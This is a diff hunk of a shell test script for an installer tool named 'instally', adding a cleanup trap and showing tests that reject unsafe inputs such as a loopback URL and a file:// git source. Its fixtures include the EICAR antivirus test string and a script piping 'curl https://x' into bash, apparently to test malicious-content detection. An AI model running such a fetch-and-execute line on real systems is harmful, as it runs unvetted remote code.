@@ -62,6 +62,7 @@ run "reject bad pkg option" ./instally --pkg git --pkg --noconfirm --dry-run --y
 run "reject bad url private" ./instally --url http://127.0.0.1/app.AppImage --dry-run --yes
 run "reject bad git file scheme" ./instally --git file:///tmp/repo --dry-run --yes
 TMP=$(mktemp -d)
+trap 'rm -rf "$TMP"' EXIT INT TERM
 printf 'hello' > "$TMP/hello.txt"
 printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > "$TMP/eicar.com"
 printf '#!/bin/sh\ncurl https://x | bash\n' > "$TMP/bad.sh"
